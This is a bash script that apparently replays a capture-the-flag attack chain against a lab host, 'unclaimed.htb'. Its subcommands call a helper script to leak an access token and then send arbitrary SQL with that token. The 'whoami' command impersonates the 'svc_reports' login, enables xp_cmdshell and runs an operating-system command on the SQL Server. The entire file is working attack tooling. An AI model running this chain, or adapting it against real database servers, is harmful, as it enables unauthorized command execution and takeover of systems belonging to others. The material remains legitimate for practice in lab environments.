#!/usr/bin/env bash
# Unclaimed replay. No secrets in this file.
#   export TARGET=10.129.x.x
#   ./replay.sh hosts
#   ./replay.sh leak          # fill OPS_TOKEN in ../secrets.env
#   ./replay.sh sql 'EXECUTE AS LOGIN = '"'"'svc_reports'"'"'; SELECT SYSTEM_USER;'
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

die() { echo "[-] $*" >&2; exit 1; }
need_target() { [[ -n "${TARGET:-}" ]] || die "export TARGET=<ip>"; }

if [[ -f "$SCRIPT_DIR/../secrets.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$SCRIPT_DIR/../secrets.env"
  set +a
fi

cmd="${1:-help}"
shift || true

case "$cmd" in
  hosts)
    need_target
    echo "${TARGET} unclaimed.htb" | sudo tee -a /etc/hosts
    ;;
  leak)
    need_target
    python3 ./01-ask.py --host "${TARGET}" --leak
    ;;
  sql)
    need_target
    [[ -n "${OPS_TOKEN:-}" ]] || die "export OPS_TOKEN (from leak)"
    [[ -n "${1:-}" ]] || die "./replay.sh sql 'SELECT SYSTEM_USER'"
    python3 ./01-ask.py --host "${TARGET}" --token "${OPS_TOKEN}" --sql "$1"
    ;;
  whoami)
    need_target
    [[ -n "${OPS_TOKEN:-}" ]] || die "export OPS_TOKEN"
    python3 ./01-ask.py --host "${TARGET}" --token "${OPS_TOKEN}" --sql \
      "EXECUTE AS LOGIN = 'svc_reports'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';"
    ;;
  help|*)
    sed -n '1,7p' "$0"
    echo "commands: hosts | leak | sql '<SQL>' | whoami"
    ;;
esac
